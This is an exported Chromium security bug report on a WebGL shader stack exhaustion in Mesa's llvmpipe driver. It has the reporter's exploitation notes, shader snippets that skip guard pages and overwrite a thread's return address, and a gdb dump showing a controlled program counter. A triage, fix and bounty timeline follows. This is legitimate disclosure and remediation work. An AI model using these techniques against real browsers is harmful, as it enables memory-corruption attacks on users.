# Security: WebGL Shader Stack Exhaustion leading to PC control in llvmpipe

| Field | Value |
|-------|-------|
| **Issue ID** | [40054092](https://issues.chromium.org/issues/40054092) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGL, Internals>GPU>Internals |
| **Platforms** | Linux |
| **Reporter** | ja...@gmail.com |
| **Assignee** | ka...@chromium.org |
| **Created** | 2020-12-06 |
| **Bounty** | $1,000.00 |

## Description

# WebGL Shader Stack Exhaustion leading to PC control in llvmpipe

There seem to be a stack exhaustion in ANGLE - Almost Native Graphics Layer Engine.
This triggers on the GPU or the CPU if llvmpipe is used.
# Poc

See `llvmpipe.ubuntu20.04.write.pc.html`. This has been on a Ubtuntu 20.04 in Virtual Box

```
Renderer: ANGLE (VMware, Inc., llvmpipe (LLVM 10.0.0, 256 bits), OpenGL 3.3 core)
Chromium Version: Chromium 87.0.4280.66 snap
Type of crash: gpu process

Crash State:

Thread 3 "llvmpipe-1" received signal SIGSEGV, Segmentation fault.
[Switching to LWP 2897]
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x1800000018 
RCX: 0x7fd6624b0e5e (<pthread_barrier_wait+286>:	cmp    rax,0xfffffffffffff000)
RDX: 0x1 
RSI: 0x80 
RDI: 0x561839f96884 --> 0x4000003cc 
RBP: 0x1900000019 
RSP: 0x7fd644229a90 --> 0x434400004344 ('DC')
RIP: 0x434445464748 ('HGFEDC')
R8 : 0x3c9 
R9 : 0x561839f96880 --> 0x3cc000003cf 
R10: 0x0 
R11: 0x282 
R12: 0x1900000019 
R13: 0x1900000019 
R14: 0x1900000019 
R15: 0x434445464748 ('HGFEDC')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x434445464748
[------------------------------------stack-------------------------------------]
0000| 0x7fd644229a90 --> 0x434400004344 ('DC')
0008| 0x7fd644229a98 --> 0x434400004344 ('DC')
0016| 0x7fd644229aa0 --> 0x1b0000001b 
0024| 0x7fd644229aa8 --> 0x1b0000001b 
0032| 0x7fd644229ab0 --> 0x1b0000001b 
0040| 0x7fd644229ab8 --> 0x1b0000001b 
0048| 0x7fd644229ac0 --> 0x1c0000001c 
0056| 0x7fd644229ac8 --> 0x1c0000001c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000434445464748 in ?? ()
gdb-peda$ bt

```

# Bug

We can define arrays inside a shader and make them quite large.
Those are allocated on the stack, regardless of the stack size of the computing engine.
Therefore, we have a giant "sub $rsp, xxx" in the beginning of the shader function.

```
    precision mediump float;
    vec4 x[42000000]; //Allocate lots of memory
    int i;

    varying vec4 vColor;
    void main(void) {
        gl_FragColor = x[42]; //used so x is not optimized out
    }
```

The shader language has some important limitations:
 - Recursive shader functions are not allowed.
 - Array indices must be constant.
 - Small arrays (<16 elements or so) might be optimized out.
 - Functions, that are called once will be inlined
 - Everything, that is not needed is optimized out.

Shaderlanguage is defined [here](https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf)


# llvmpipe

The LLVM Pipe driver is used on Linux if no graphics card is available and is part of mesa.
TLDR: We have PC control but no leak

Each core has its own thread for executing shaders.
Triggereing the bug here allows us to jump into the stack frame of the next process.
Stacks are separated with guard pages, a 4096 byte region, that is not readable, writable or executable.
Those can be skipped usig the following code:

```
int x[0x00080];
void main(void) {
  gl_FragColor = vec4(float(x[0]); //required so x is not optimzed out

  // Here we allocate memory, without writing to it
  if (int(x[0]) == 42) {
    int pad[0x40000];
    gl_FragColor += vec4(float(pad[42]));
  }
}
```

This will translate to the following code:


```
void initGlobals();
varying mediump float webgl_51cdbba1f77a8b72;
mediump int webgl_4fc82888d13de398[128];
void main(){
    initGlobals();
    (gl_FragColor = vec4(float(webgl_4fc82888d13de398[0])));

    if ((int(webgl_4fc82888d13de398[0]) == 42)) {
        mediump int webgl_b84b23e845ea3eb[262144];
        for (highp int s920 = 0; (s920 < 262144); (++s920)) {
            (webgl_b84b23e845ea3eb[s920] = 0);
        }
        (gl_FragColor += vec4(float(webgl_b84b23e845ea3eb[42])));
    }
}
void initGlobals(){
    for (highp int s91e = 0; (s91e < 128); (++s91e)) {
        (webgl_4fc82888d13de398[s91e] = 0);
    }
}

```

Not that pad is declared and initialized within the consequent of the if statement.
As the expression is always false, the initialization is never executed.
However the stack frame is allocated on function entry and not modified within a code block.
Therefore, we can allocate memory without writing to it and skip guard pages.


By tuning the offsets, we an directly overwrite the return address of a llvmpipe thread.
One thing to note is, that 8 pixels are computed per thread.
Therefore allocates each 32-bit int 32 bytes in memory.
To control the upper and lower half of a 64-bit address, we have to put different values insinde the array for two pixels.
One way to accomplish this is to use varying variables.


```
varying float floatVar;

[...]
    if(floatVar > 0.) 
      x[0x1a] = 0x4344;
    else
      x[0x1a] = 0x45464748;

```

There are no stack-canaries within the llvmpipe threads

# Leak

I do not see a trivial way to convert this bug into a leak right now.
As we want to leak pointers, we also have the chance of overwriting them, resulting in a crash.
This makes exploitation possibly unreliable.


## Attachments

- [llvmpipe.ubuntu20.04.write.pc.html](attachments/llvmpipe.ubuntu20.04.write.pc.html) (text/plain, 4.5 KB)

## Timeline

### [Deleted User] (2020-12-06)

[Empty comment from Monorail migration]

### es...@chromium.org (2020-12-07)

[Empty comment from Monorail migration]

### ja...@gmail.com (2020-12-07)

Not realy relevant for this bug, but the report should come from the @ernw address as it was the result of paid research. I've messed up my accounts somehow.

sorry for the inconvenience

### cl...@chromium.org (2020-12-08)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5721355963400192.

### ja...@gmail.com (2020-12-08)

Hi,
I saw that clusterfuzz failed to reproduce the testcase. It seems that swift shader is used instead of llvmpipe due to the added option ``--use-gl=angle --use-angle=swiftshader``. The google swift shader is not affected and the compilation of the buggy shader is fails with ``Array size of (xxx) exceeds limit of gl_MaxFragmentUniformVectors(261)``. The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.

An other common ground I could identify is:
Affected: GL_VERSION = OpenGL ES x.y.z
Not Affected: GL_VERSION = OpenGL ES x.y.z SwiftShader a.b.c

On a Pixel4 with Android 11 the shader also compiles indicating a missing check. However the bug triggers on the GPU leading to strange behavior (In some cases system UI freeze/crash) and no PC control.

If this bug is not within the chrome project and can pinpoint the affected project please let me know.

[1] https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&alt=media

### wf...@chromium.org (2020-12-08)

Hi Jan, do you know command line options we could use to force the use of llvmpipe on clusterfuzz? How widespread is llvmpipe use on systems that run Chrome?

[Monorail components: Blink>WebGL]

### wf...@chromium.org (2020-12-08)

[Empty comment from Monorail migration]

### ka...@chromium.org (2020-12-08)

Any system with Mesa (i.e. pretty much all Linux systems) should have llvmpipe available as a fallback. A quick search shows that the way to do this nowadays is to set:

LIBGL_ALWAYS_SOFTWARE=1
GALLIUM_DRIVER=llvmpipe

https://docs.mesa3d.org/envvars.html
(I seem to remember it used to be a bit harder, had to set some LD variables, but that probably isn't necessary anymore.)

In Chromium you might also need --ignore-gpu-blocklist if Chromium blocklists llvmpipe. I'm not sure whether we do - on a cursory inspection, I only see an entry for a very old version of Mesa, so we may not blocklist it.
https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json

### ka...@chromium.org (2020-12-08)

> The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.

llvmpipe is not an ANGLE backend, so you can't do --use-angle=llvmpipe. llvmpipe is part of Mesa, which is system software.

### ka...@chromium.org (2020-12-08)

> How widespread is llvmpipe use on systems that run Chrome?

Unfortunately I don't know the answer to this. We have a dashboard but I believe it doesn't cover Linux, which means we won't see it there. But we must have the data somewhere.
go/uma-gpu-stats
(Note the 0.06% of users on that dashboard with Vendor=VMware are prooobably using Windows in VMware virtual machines (I worked on that driver at VMware!), not llvmpipe which also has Vendor=VMware.)

+behdadb for that dashboard.

### wf...@chromium.org (2020-12-09)

Hi reporter, it seems this might be an issue with mesa3d, I wonder if you could go ahead and report the bug with them via https://docs.mesa3d.org/bugs.html then link it here. As part of the Chromium VRP we are happy to pay for bugs in components we depend on, but it would require the upstream to fix it.

### wf...@chromium.org (2020-12-10)

[Empty comment from Monorail migration]

### ja...@gmail.com (2020-12-14)

Sorry for the delay, reported as [1] (non-public).

[1] https://gitlab.freedesktop.org/mesa/mesa/-/issues/3976

### aj...@google.com (2020-12-24)

Setting tags/status. Feel free to suggest mesa people we can CC into this bug.

Setting kainino as owner as we like security bugs to have owners. Reassign to someone else if this makes sense.

### [Deleted User] (2020-12-24)

[Empty comment from Monorail migration]

### [Deleted User] (2020-12-24)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-12-24)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ka...@chromium.org (2021-01-05)

kbr: Do you think we should add llvmpipe to our software rendering list if it's not already there? I would have thought we already blocked llvmpipe since I think we block other software renderers (and rely on our own software paths + swiftshader). That would resolve this issue on chrome's side without blocking on a Mesa fix.

### kb...@chromium.org (2021-01-05)

Yes, we should consider blocklisting llvmpipe again. We can do so for WebGL only.

Is it known whether this is a recent regression in Mesa that would imply a more narrow blocklist entry?

Submitter: please file a bug upstream against Mesa, because otherwise this will basically never be fixed.


[Monorail components: Internals>GPU>Internals]

### ja...@gmail.com (2021-01-06)

I've filed a bug at the Mesa project as you suggested three weeks ago (Non Public: https://gitlab.freedesktop.org/mesa/mesa/-/issues/3976)

@ajgo asked the Mesa team to add access for current Owner and CC List to the Issue. Exccept for a llvmpipe Tag, nothing really happen there.

### ka...@chromium.org (2021-01-06)

> Is it known whether this is a recent regression in Mesa that would imply a more narrow blocklist entry?

Do we want a more narrow blocklist entry? I thought we would prefer to rely on our own (domain specific, so hopefully more efficient) software paths, at least for everything other than WebGL. And for WebGL, SwiftShader avoids unknown factors like llvmpipe (or swrast?)

### kb...@chromium.org (2021-01-06)

Fair points. Could you put up the broad blocklist CL and let's review it?

One note - searching the bug database for llvmpipe related bugs:
https://bugs.chromium.org/p/chromium/issues/list?q=llvmpipe&can=1

a broad blocklist may impact ChromeOS testing at least - see https://crbug.com/chromium/955198. +frkoenig


### [Deleted User] (2021-01-14)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-21)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-21)

kainino: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/7c7eccfc85e387a0dcd154a2a9c2389177982837

commit 7c7eccfc85e387a0dcd154a2a9c2389177982837
Author: Kai Ninomiya <kainino@chromium.org>
Date: Sat Jan 23 00:52:10 2021

Disable GPU acceleration on all Mesa software rasterizers

The previous entry only disabled acceleration on swrast, but softpipe
and llvmpipe shouldn't be used for "GPU" acceleration either.
This should apply to Linux but not ChromeOS, AFAICT.

This only improves an existing software rendering list entry, but here
is the rationale: We prefer to rely on our own (domain specific, so more
efficient) software paths, at least for everything other than WebGL. And
for WebGL, SwiftShader avoids unknown factors like
llvmpipe/softpipe/swrast.

If you are running a Mesa GL driver (not e.g. NVIDIA) then you can force
these configurations with:
- LIBGL_ALWAYS_SOFTWARE=1
  https://docs.mesa3d.org/envvars.html#libgl-environment-variables:~:text=LIBGL_ALWAYS_SOFTWARE
- GALLIUM_DRIVER=llvmpipe, softpipe, or swr (though swr didn't work for me)
  https://docs.mesa3d.org/envvars.html#gallium-environment-variables:~:text=GALLIUM_DRIVER

The GL_RENDERER strings are:
- swrast: "Software Rasterizer" (couldn't test this locally; found this online)
- softpipe: "softpipe" (on one machine)
- llvmpipe: "llvmpipe (LLVM 10.0.0, 256 bits)" (on one machine)

Drive-by updates the description of another item to be more accurate
(SVGA3D is virtualized over hardware; it's not a software renderer).

Bug: 1155974
Change-Id: I0571c1a1bf526260f7ea6cd53f88eec768973b13
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2645491
Commit-Queue: Kai Ninomiya <kainino@chromium.org>
Reviewed-by: Zhenyao Mo <zmo@chromium.org>
Auto-Submit: Kai Ninomiya <kainino@chromium.org>
Cr-Commit-Position: refs/heads/master@{#846422}

[modify] https://crrev.com/7c7eccfc85e387a0dcd154a2a9c2389177982837/gpu/config/software_rendering_list.json


### ka...@chromium.org (2021-01-23)

This should fix the issue. I'll verify in a few days that Chrome Dev is behaving correctly with llvmpipe or softpipe.
http://chromiumdash.appspot.com/commit/7c7eccfc85e387a0dcd154a2a9c2389177982837

### [Deleted User] (2021-01-24)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-24)

Requesting merge to stable M88 because latest trunk commit (846422) appears to be after stable branch point (1784).

Requesting merge to beta M88 because latest trunk commit (846422) appears to be after beta branch point (1784).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-01-24)

This bug requires manual review: Request affecting a post-stable build
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), marinakz@(ChromeOS), srinivassista @(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2021-01-26)

Landed after M89 branch point so adding merge request.

### [Deleted User] (2021-01-26)

This bug requires manual review: There is .json file changes and we are only 34 days from stable. Please confirm this does not require string translation.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), geohsu@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ka...@chromium.org (2021-01-27)

> 1. Does your merge fit within the Merge Decision Guidelines?
Yes, it only changes a hardware configuration blocklist.

> 2. Links to the CLs you are requesting to merge.
Original: https://chromium-review.googlesource.com/c/chromium/src/+/2645491
M88 cherry-pick: https://chromium-review.googlesource.com/c/chromium/src/+/2651183
M89 cherry-pick: https://chromium-review.googlesource.com/c/chromium/src/+/2650143

> 3. Has the change landed and been verified on ToT?
Not verified yet as it's Linux-only so has to wait for a Dev channel release.

> 4. Does this change need to be merged into other active release branches (M-1, M+1)?
Yes

> 5. Why are these changes required in this milestone after branch?
Blocks unnecessary usage of system's buggy software rendering implementation.

> 6. Is this a new feature?
No
> 7. If it is a new feature, is it behind a flag using finch?
N/A

### ad...@google.com (2021-01-27)

Approving merge to M89, branch 4389. Please go ahead and merge. We'll consider M88 merges (for the next stable refresh) in a couple of days to give maximum possible bake time before merging.

VRP panel: this is a workaround for a Mesa3D bug.

### ka...@chromium.org (2021-01-27)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/b2058f9f30cbc5e5249897fd432d1febc40a4d35

commit b2058f9f30cbc5e5249897fd432d1febc40a4d35
Author: Kai Ninomiya <kainino@chromium.org>
Date: Wed Jan 27 05:34:27 2021

Disable GPU acceleration on all Mesa software rasterizers

The previous entry only disabled acceleration on swrast, but softpipe
and llvmpipe shouldn't be used for "GPU" acceleration either.
This should apply to Linux but not ChromeOS, AFAICT.

This only improves an existing software rendering list entry, but here
is the rationale: We prefer to rely on our own (domain specific, so more
efficient) software paths, at least for everything other than WebGL. And
for WebGL, SwiftShader avoids unknown factors like
llvmpipe/softpipe/swrast.

If you are running a Mesa GL driver (not e.g. NVIDIA) then you can force
these configurations with:
- LIBGL_ALWAYS_SOFTWARE=1
  https://docs.mesa3d.org/envvars.html#libgl-environment-variables:~:text=LIBGL_ALWAYS_SOFTWARE
- GALLIUM_DRIVER=llvmpipe, softpipe, or swr (though swr didn't work for me)
  https://docs.mesa3d.org/envvars.html#gallium-environment-variables:~:text=GALLIUM_DRIVER

The GL_RENDERER strings are:
- swrast: "Software Rasterizer" (couldn't test this locally; found this online)
- softpipe: "softpipe" (on one machine)
- llvmpipe: "llvmpipe (LLVM 10.0.0, 256 bits)" (on one machine)

Drive-by updates the description of another item to be more accurate
(SVGA3D is virtualized over hardware; it's not a software renderer).

(cherry picked from commit 7c7eccfc85e387a0dcd154a2a9c2389177982837)

Bug: 1155974
Change-Id: I0571c1a1bf526260f7ea6cd53f88eec768973b13
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2645491
Commit-Queue: Kai Ninomiya <kainino@chromium.org>
Reviewed-by: Zhenyao Mo <zmo@chromium.org>
Auto-Submit: Kai Ninomiya <kainino@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#846422}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2650143
Commit-Queue: Kenneth Russell <kbr@chromium.org>
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Cr-Commit-Position: refs/branch-heads/4389@{#304}
Cr-Branched-From: 9251c5db2b6d5a59fe4eac7aafa5fed37c139bb7-refs/heads/master@{#843830}

[modify] https://crrev.com/b2058f9f30cbc5e5249897fd432d1febc40a4d35/gpu/config/software_rendering_list.json


### ad...@google.com (2021-01-27)

Due to the fact that this is Linux-only so has to wait for a dev channel release (per https://crbug.com/chromium/1155974#c34) I'm not going to approve this for merge to M88 yet.

### am...@google.com (2021-01-27)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@google.com (2021-01-27)

Congratulations, jan.s.ruge@! The VRP Panel has decided to reward you $1000 for this report. A member of our finance team should be getting in touch with you soon. Also, you mentioned above you meant to submit this report from another email address and would like to be credited via your @ernw(.de?) email address? Please confirm and let us know the full name or handle by which you would like to be credited. 
Thank you again for your submission and bringing this issue to our attention! 

### am...@google.com (2021-01-28)

[Empty comment from Monorail migration]

### ja...@gmail.com (2021-02-02)

That are great news, thanks a lot!
Yes crediting should be performed via the @ernw.de address. My full name is "Jan Ruge" working at "ERNW GmbH".

Thanks and best, Jan

### ka...@chromium.org (2021-02-02)

Confirmed behavior looks good in 90.0.4400.8 (Official Build) dev (64-bit) by inspecting chrome://gpu with:

LIBGL_ALWAYS_SOFTWARE=1 GALLIUM_DRIVER=llvmpipe google-chrome-unstable
LIBGL_ALWAYS_SOFTWARE=1 GALLIUM_DRIVER=softpipe google-chrome-unstable
LIBGL_ALWAYS_SOFTWARE=1 GALLIUM_DRIVER=swr google-chrome-unstable
(it turns out swrast does work, it's just that glxgears, which I used to check the config, doesn't work with it)

All three configurations exit "GPU process due to errors during initialization" and fall back to SwiftShader as expected.

### ka...@chromium.org (2021-02-02)

(forgot to say, also tested google-chrome-stable with no flags and it still correctly used the system's GPU.)

### ad...@chromium.org (2021-02-10)

Approving merge to M88, branch 4324, assuming no problems have been reported against dev. Please merge before the end of Thursday PST so that this gets into next week's stable refresh.

### ka...@chromium.org (2021-02-11)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-02-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/62bda83979fb5cd663e86706ebf8ee05a28c91c9

commit 62bda83979fb5cd663e86706ebf8ee05a28c91c9
Author: Kai Ninomiya <kainino@chromium.org>
Date: Thu Feb 11 02:24:04 2021

Disable GPU acceleration on all Mesa software rasterizers

The previous entry only disabled acceleration on swrast, but softpipe
and llvmpipe shouldn't be used for "GPU" acceleration either.
This should apply to Linux but not ChromeOS, AFAICT.

This only improves an existing software rendering list entry, but here
is the rationale: We prefer to rely on our own (domain specific, so more
efficient) software paths, at least for everything other than WebGL. And
for WebGL, SwiftShader avoids unknown factors like
llvmpipe/softpipe/swrast.

If you are running a Mesa GL driver (not e.g. NVIDIA) then you can force
these configurations with:
- LIBGL_ALWAYS_SOFTWARE=1
  https://docs.mesa3d.org/envvars.html#libgl-environment-variables:~:text=LIBGL_ALWAYS_SOFTWARE
- GALLIUM_DRIVER=llvmpipe, softpipe, or swr (though swr didn't work for me)
  https://docs.mesa3d.org/envvars.html#gallium-environment-variables:~:text=GALLIUM_DRIVER

The GL_RENDERER strings are:
- swrast: "Software Rasterizer" (couldn't test this locally; found this online)
- softpipe: "softpipe" (on one machine)
- llvmpipe: "llvmpipe (LLVM 10.0.0, 256 bits)" (on one machine)

Drive-by updates the description of another item to be more accurate
(SVGA3D is virtualized over hardware; it's not a software renderer).

# Unrelated CQ failures on branch
(cherry picked from commit 7c7eccfc85e387a0dcd154a2a9c2389177982837)

No-Try: True
Bug: 1155974
Change-Id: I0571c1a1bf526260f7ea6cd53f88eec768973b13
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2645491
Commit-Queue: Kai Ninomiya <kainino@chromium.org>
Reviewed-by: Zhenyao Mo <zmo@chromium.org>
Auto-Submit: Kai Ninomiya <kainino@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#846422}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2651183
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Cr-Commit-Position: refs/branch-heads/4324@{#2176}
Cr-Branched-From: c73b5a651d37a6c4d0b8e3262cc4015a5579c6c8-refs/heads/master@{#827102}

[modify] https://crrev.com/62bda83979fb5cd663e86706ebf8ee05a28c91c9/gpu/config/software_rendering_list.json


### ad...@google.com (2021-02-13)

[Empty comment from Monorail migration]

### ac...@chromium.org (2021-02-19)

Not applicable to ChromeOS

### am...@google.com (2021-02-22)

[Empty comment from Monorail migration]

### am...@google.com (2021-02-22)

[Empty comment from Monorail migration]

### vs...@google.com (2021-04-28)

[Empty comment from Monorail migration]

### [Deleted User] (2021-05-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### kb...@chromium.org (2021-09-22)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1155974?no_tracker_redirect=1

[Multiple monorail components: Blink>WebGL, Internals>GPU>Internals]
[Monorail blocking: crbug.com/chromium/1170819, crbug.com/chromium/1176528, crbug.com/chromium/1252077]
[Monorail mergedwith: crbug.com/chromium/1155975]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054092)*
